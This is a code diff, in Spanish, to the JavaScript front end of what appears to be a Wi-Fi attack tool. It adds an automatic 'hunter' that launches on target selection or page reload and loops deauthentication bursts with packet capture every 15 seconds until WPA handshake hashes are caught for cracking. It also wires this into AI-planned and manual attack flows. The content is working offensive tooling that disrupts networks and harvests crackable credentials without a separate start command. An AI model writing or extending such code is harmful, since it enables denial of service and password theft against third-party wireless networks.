@@ -221,7 +221,9 @@ window.selectNetwork = function (bssid, ssid, signal, channel, security) {
   profileTarget(bssid);
   renderTargetBar();
   if (window.setIaStatus) window.setIaStatus('Objetivo seleccionado: ' + (ssid||'red') + ' · CH ' + (channel||'?') + '. Listo para atacar.');
-  void window.checkPmfGate(bssid, channel);
+  window.checkPmfGate(bssid, channel).then((ok) => {
+    if (ok && !window._hunterActive) startHunter(bssid, ssid, channel);
+  });
 
   window.showTab('attack');
 };
@@ -794,6 +796,75 @@ function rowsHtml(nets) {
   `).join('');
 }
 
+// ── Cazador automático de handshake (sin botón) ─────────────────────────────
+// Arranca solo al seleccionar objetivo (o al abrir si había uno guardado),
+// caza en bucle con deauth+watch y para con EAPOL o con «Detener».
+const HUNTER_KEY = 'uifipill_hunter_target';
+window._hunterActive = false;
+window._hunterRunning = false;
+window._hunterTimer = null;
+window._hunterCycle = 0;
+window._hunterTarget = null;
+
+function hunterStatus(txt) {
+  const el = $('hunter-status');
+  if (el) el.textContent = txt;
+}
+function saveHunterTarget(bssid, ssid, channel) {
+  try { localStorage.setItem(HUNTER_KEY, JSON.stringify({ bssid, ssid, channel })); } catch {}
+}
+function stopHunter(reason) {
+  if (!window._hunterActive && !window._hunterRunning) return;
+  window._hunterActive = false;
+  if (window._hunterTimer) { clearTimeout(window._hunterTimer); window._hunterTimer = null; }
+  hunterStatus('');
+  log('[cazador] detenido' + (reason ? ' (' + reason + ')' : '') + '.', 'warn');
+}
+function startHunter(bssid, ssid, channel) {
+  if (!bssid) { log('[cazador] sin objetivo: no arranca.', 'warn'); return; }
+  stopHunter();
+  window._hunterActive = true;
+  window._hunterRunning = false;
+  window._hunterCycle = 0;
+  window._hunterTarget = { bssid, ssid: ssid || '', channel: parseInt(channel) || 0 };
+  window._simpleStop = false;
+  saveHunterTarget(bssid, ssid, channel);
+  hunterStatus('🐺 cazando…');
+  log('[cazador] ACTIVO contra ' + bssid + (channel ? ' CH' + channel : '') + ' — deauth + captura en bucle; para con «Detener» o al capturar EAPOL.', 'warn');
+  hunterCycle();
+}
+async function hunterCycle() {
+  if (!window._hunterActive || window._hunterRunning || !window._hunterTarget) return;
+  window._hunterRunning = true;
+  const t = window._hunterTarget;
+  const cy = ++window._hunterCycle;
+  try {
+    log('[cazador] ciclo ' + cy + ': ráfaga deauth + watcher en ' + t.bssid + (t.channel ? ' CH' + t.channel : ''), 'info');
+    const r = await window.iaDeauthBurst({ bssid: t.bssid, channel: t.channel, target_mac: null });
+    if (r && r.success && r.hashes > 0) {
+      log('[cazador] ⚡ HANDSHAKE CAPTURADO: ' + r.output_file + ' (' + r.hashes + ' hashes) · pcapng ' + r.pcapng, 'ok');
+      hunterStatus('⚡ capturado');
+      stopHunter('material capturado');
+      return;
+    }
+    log('[cazador] ciclo ' + cy + ' sin material' + (r && r.message ? ' · ' + String(r.message).slice(0, 120) : '') + '.', 'warn');
+  } catch (e) {
+    log('[cazador] error en ciclo ' + cy + ': ' + e, 'error');
+  } finally {
+    window._hunterRunning = false;
+  }
+  if (window._hunterActive) window._hunterTimer = setTimeout(hunterCycle, 15000);
+}
+window.maybeAutoHunter = function () {
+  if (window._hunterActive) return;
+  let t = null;
+  try { t = JSON.parse(localStorage.getItem(HUNTER_KEY) || 'null'); } catch {}
+  if (!t || !t.bssid) return;
+  const n = lastNets.find(x => (x.bssid || '').toUpperCase() === String(t.bssid).toUpperCase());
+  log('[cazador] objetivo guardado ' + t.bssid + ' — reanudando caza automática.', 'info');
+  startHunter(t.bssid, t.ssid || (n && n.ssid) || '', t.channel || (n && n.channel) || 0);
+};
+
 // Devolver la radio a managed al terminar un ataque (si quedó en monitor).
 async function restoreRadioAfterAttack() {
   try {
@@ -1184,6 +1255,7 @@ window.setIaMode = function (on) {
 
 window.iaAttack = async function () {
   if (!claimAttack('ia_attack')) return;
+  stopHunter('ataque manual');
   setAttackRunning(true, 'IA: planificando ataque…');
   window._simpleOrchestrating = true;
   window._simpleStop = false;
@@ -2118,6 +2190,8 @@ setTimeout(async () => {
         window._crackBackend = cb;
         if (cb && !cb.ready) log('[crack] ' + cb.message, 'warn');
     } catch (e) { console.error('Preflight crack falló:', e); }
+    // Reanudar el cazador automático si había un objetivo guardado.
+    try { window.maybeAutoHunter(); } catch (e) { console.error('Cazador:', e); }
 }, 600);// AUTO-ATTACK MAESTRO
 // Ejecuta todos los ataques disponibles en secuencia contra un objetivo
 
@@ -2504,6 +2578,7 @@ window.simpleAttack = async function () {
       return;
     }
   }
+  stopHunter('ataque manual');
   // E0-20 fase 1: gate PMF antes de cualquier ataque con objetivo RF.
   const pmfBssid = ($('attack-bssid')?.value || '').trim() || valOrEmpty($('ultra-bssid')?.value) || '';
   if (pmfBssid && !(await window.checkPmfGate(pmfBssid, selectedChannel()))) return;
@@ -2767,6 +2842,7 @@ window.simplePwnagotchiKit = async function () {
 };
 
 window.simpleStop = async function () {
+  stopHunter('Detener');
   window.setIaStatus('IA: deteniendo…');
   window._simpleStop = true;
   window._autoStop = true;
